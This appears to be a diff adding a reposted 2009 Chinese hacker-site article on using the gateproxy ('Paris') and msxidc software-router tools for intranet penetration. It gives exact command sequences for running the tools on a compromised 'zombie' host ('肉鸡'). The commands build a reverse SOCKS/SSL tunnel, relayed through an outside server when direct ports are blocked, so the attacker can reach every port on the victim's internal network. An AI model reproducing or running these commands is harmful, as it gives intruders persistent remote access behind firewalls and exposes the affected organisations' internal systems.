@@ -1,0 +1,70 @@
+
+ 2009-09-29 10:29:50  www.hackbase.com  来源：小博'Blog
+软件作者:horseb 此工具能够让你在内网渗透中事半功倍.让你的计算机属于对方内网的状态。使用方法:目前流行的httptunnel其实还属于正向隧道，有WINDOWS OS的防火墙或ipsec端口过滤比较严格的话，没办法使用，而 ...
+软件作者:horseb 
+
+此工具能够让你在内网渗透中事半功倍.让你的计算机属于对方内网的状态。
+使用方法:
+目前流行的httptunnel其实还属于正向隧道，有WINDOWS OS的防火墙或ipsec端口过滤比较严格的话，没办法使用，而且现在的通道除了VPN比较可靠安全，其他都不可靠。
+
+Paris经过使用比较安全可靠
+目前主要有下面的用法：
+1．入侵内网时，在能占领的出口或代理主机上运行softrouter，外网softrouter server 可以关联内网主机这样在外网就很方便的控制内网主机。
+2. 如果内网有一些有特殊应用服务的主机，但是不能通过公司的路由器配置映射到外网的，这里可以通过这个软件把相应端口映射到外网，这样外网就可以使用内网上某些资源，比如web站点。
+
+使用Paris 建立 VPN方法：
+如何建立VPN 
+1。方案
+在202.106.0.202# gateproxy.exe-P2380 STLS=fcl SERVER=socks
+在192.168.1.12# gateproxy.exe -P1100 STLS=fsv SERVER=socks SOCKS=202.106.0.202:2380
+
+内网IP 192.168.1.12
+
+肉鸡IP 202.106.0.202
+
+如果肉鸡的端口能正向连接的话可以做的
+先在肉鸡上执行在202.106.0.202# gateproxy.exe-P2380 STLS=fcl SERVER=socks
+然后再在自己的机器上执行gateproxy.exe -P1100 STLS=fsv SERVER=socks SOCKS=202.106.0.202:2380
+
+这样你的网络192.168.1.12 就可以访问 202.106.0.202 这台机器对应的内网的所有机器的所有端口了
+
+
+2.方案2
+在202.106.0.202# gateproxy.exe-P2380 STLS=fcl SERVER=socks
+在202.106.0.202# msxidc.exe -l127.0.0.1 -p2380 -m99 -s218.155.0.1 -r9001
+在192.168.1.12# gateproxy.exe -P1100 STLS=fsv SERVER=socks SOCKS=218.155.0.1:99
+
+这里说明一下，这里的msxidc.exe程序是Rootkit.com.cn 的软件路由程序
+这里是为了解决肉鸡IP 202.106.0.202封正向端口的情况的，如果肉鸡IP 202.106.0.202：2380端口
+连不上的话，就要用msxidc.exe把202.106.0.202：2380转到218.155.0.1:99的端口上，我们连接
+218.155.0.1:99就等于连接上了肉鸡IP 202.106.0.202：2380了，这样就通过218.155.0.1:99端口
+中转建立了和肉鸡202.106.0.202：2380的SSL VPN了
+这里的218.155.0.1:9001 是softrouter的另外一个转发的侦听服务的端口
+
+注意：这里必须要按照以上命令序列执行，否则不能连接上
+
+附软件路由器的其他使用语法：
+$$$$$$$$$$ software router version 0.01 $$$$$$$$$$$$$$
+
+$$$$$$$$$$ copyright@2005 horse_b $$$$$$$$$$$$$$$$$$
+
+msxidc -lVIM_IP -pVIMHOST_PORT -mMAP_MSvIDCs_PORT -sMSvIDCs_IP -rMSvIDCs_PORT
+
+example:msxidc -l10.0.0.1 -p1433 -m99 -s218.155.0.1 -r9001
+
+
+内网要连到外面的主机 10.0.0.1 这台内网主机要提供给外网的服务端口 1433 在外网上映射成的端口99 外网softrouterserver 的IP218.155.0.1 外网softrouterserver 的PORT 9001 
+
+这样我们就能在外网访问 218.155.0.1：99 就随时访问内网的 10.0.0.1：1433 
+
+msxidc -MMAP_MSvIDCs_PORT -SMSvIDCs_IP -RMSvIDCs_PORT
+
+example:msxidc -M99 -S218.155.0.1 -R9001
+
+msxidc -PLOCALHOST_PORT -XMAP_MSvIDCs_PORT -YMSvIDCs_IP -ZMSvIDCs_PORT
+
+example:msxidc -P1433 -X99 -Y218.155.0.1 -Z9001
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+
+本篇文章来源于 黑客基地-全球最大的中文黑客站 原文链接：http://www.hackbase.com/tech/2009-09-29/56539.html
